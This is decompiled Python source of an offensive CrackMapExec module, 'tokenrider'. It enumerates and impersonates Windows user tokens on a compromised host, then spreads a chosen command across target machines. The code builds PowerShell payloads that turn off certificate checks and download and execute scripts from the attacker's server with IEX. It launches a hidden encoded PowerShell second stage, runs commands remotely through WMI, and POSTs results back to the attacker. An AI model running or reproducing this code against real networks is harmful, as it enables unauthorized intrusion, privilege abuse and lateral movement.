# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: /home/byt3bl33d3r/.virtualenvs/CME_old/lib/python2.7/site-packages/cme/modules/token_rider.py
# Compiled at: 2016-12-29 02:34:05
from StringIO import StringIO
from cme.helpers import create_ps_command, gen_random_string, obfs_ps_script, get_ps_script
from base64 import b64encode
import sys, os

class CMEModule:
    """
        This module allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials:

        1) Invoke-TokenManipulation.ps1 is downloaded in memory and tokens are enumerated
        2) If a token is found for the specified user, a new powershell process is created (with the impersonated tokens privs)
        3) The new powershell process downloads a second stage and the specified command is then excuted on all target machines via WMI.

        Module by @byt3bl33d3r
    """
    name = 'tokenrider'
    description = 'Allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials'

    def options(self, context, module_options):
        """
            TARGET   Target machine(s) to execute the command on (comma seperated)
            USER     User to impersonate
            DOMAIN   Domain of the user to impersonate
            CMD      Command to execute on the target system(s) (Required if CMDFILE isn't specified)
            CMDFILE  File contaning the command to execute on the target system(s) (Required if CMD isn't specified)
        """
        if 'TARGET' not in module_options or 'USER' not in module_options or 'DOMAIN' not in module_options:
            context.log.error('TARGET, USER and DOMAIN options are required!')
            sys.exit(1)
        if 'CMD' not in module_options and 'CMDFILE' not in module_options:
            context.log.error('CMD or CMDFILE options are required!')
            sys.exit(1)
        if 'CMD' in module_options and 'CMDFILE' in module_options:
            context.log.error('CMD and CMDFILE are mutually exclusive!')
            sys.exit(1)
        self.target_computers = ''
        self.target_user = module_options['USER']
        self.target_domain = module_options['DOMAIN']
        if 'CMD' in module_options:
            self.command = module_options['CMD']
        else:
            if 'CMDFILE' in module_options:
                path = os.path.expanduser(module_options['CMDFILE'])
                if not os.path.exists(path):
                    context.log.error('Path to CMDFILE invalid!')
                    sys.exit(1)
                with open(path, 'r') as (cmdfile):
                    self.command = cmdfile.read().strip()
            targets = module_options['TARGET'].split(',')
            for target in targets:
                self.target_computers += ('"{}",').format(target)

        self.target_computers = self.target_computers[:-1]
        self.obfs_name = gen_random_string()

    def on_admin_login(self, context, connection):
        second_stage = ("\n        [Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};\n        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/TokenRider.ps1');").format(server=context.server, addr=context.localip, port=context.server_port)
        context.log.debug(second_stage)
        payload = ('\n        function Send-POSTRequest {{\n            [CmdletBinding()]\n            Param (\n                [string] $data\n            )\n            $request = [System.Net.WebRequest]::Create(\'{server}://{addr}:{port}/\');\n            $request.Method = \'POST\';\n            $request.ContentType = \'application/x-www-form-urlencoded\';\n            $bytes = [System.Text.Encoding]::ASCII.GetBytes($data);\n            $request.ContentLength = $bytes.Length;\n            $requestStream = $request.GetRequestStream();\n            $requestStream.Write( $bytes, 0, $bytes.Length );\n            $requestStream.Close();\n            $request.GetResponse();\n        }}\n\n        IEX (New-Object Net.WebClient).DownloadString(\'{server}://{addr}:{port}/Invoke-TokenManipulation.ps1\');\n        $tokens = Invoke-{obfs_func} -Enum;\n        foreach ($token in $tokens){{\n            if ($token.Domain -eq "{domain}" -and $token.Username -eq "{user}"){{\n\n                $token_desc = $token | Select-Object Domain, Username, ProcessId, IsElevated | Out-String;\n                $post_back = "Found token for user " + ($token.Domain + \'\\\' + $token.Username) + "! `n";\n                $post_back = $post_back + $token_desc;\n                Send-POSTRequest $post_back\n\n                Invoke-{obfs_func} -Username "{domain}\\{user}" -CreateProcess "cmd.exe" -ProcessArgs "/c powershell.exe -exec bypass -window hidden -noni -nop -encoded {command}";\n                return\n            }}\n        }}\n\n\n        Send-POSTRequest "User token not present on system!"').format(obfs_func=self.obfs_name, command=b64encode(second_stage.encode('UTF-16LE')), server=context.server, addr=context.localip, port=context.server_port, user=self.target_user, domain=self.target_domain)
        context.log.debug(payload)
        payload = create_ps_command(payload)
        connection.execute(payload, methods=['atexec', 'smbexec'])
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'Invoke-TokenManipulation.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()
            with open(get_ps_script('PowerSploit/Exfiltration/Invoke-TokenManipulation.ps1'), 'r') as (ps_script):
                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
                request.wfile.write(ps_script)
        elif 'TokenRider.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()
            command_to_execute = ('cmd.exe /c {}').format(self.command)
            elevated_ps_command = ('\n            [Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};\n            function Send-POSTRequest {{\n                [CmdletBinding()]\n                Param (\n                    [string] $data\n                )\n                $request = [System.Net.WebRequest]::Create(\'{server}://{addr}:{port}/\');\n                $request.Method = \'POST\';\n                $request.ContentType = \'application/x-www-form-urlencoded\';\n                $bytes = [System.Text.Encoding]::ASCII.GetBytes($data);\n                $request.ContentLength = $bytes.Length;\n                $requestStream = $request.GetRequestStream();\n                $requestStream.Write( $bytes, 0, $bytes.Length );\n                $requestStream.Close();\n                $request.GetResponse();\n            }}\n\n            $post_output = "";\n            $targets = @({targets});\n            foreach ($target in $targets){{\n                try{{\n                    Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $target -ArgumentList "{command}";\n                    $post_output = $post_output + "Executed command on $target! `n";\n                }} catch {{\n                    $post_output = $post_output + "Error executing command on $target $_.Exception.Message `n";\n                }}\n            }}\n            Send-POSTRequest $post_output').format(server=context.server, addr=context.localip, port=context.server_port, targets=self.target_computers, command=command_to_execute)
            request.wfile.write(elevated_ps_command)
        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = str(response.rfile.read(length))
        if len(data) > 0:
            if data.find('User token not present') != -1:
                response.stop_tracking_host()
            else:
                if data.find('Executed command') != -1 or data.find('Error executing') != -1:
                    response.stop_tracking_host()
                buf = StringIO(data.strip()).readlines()
                for line in buf:
                    context.log.highlight(line.strip())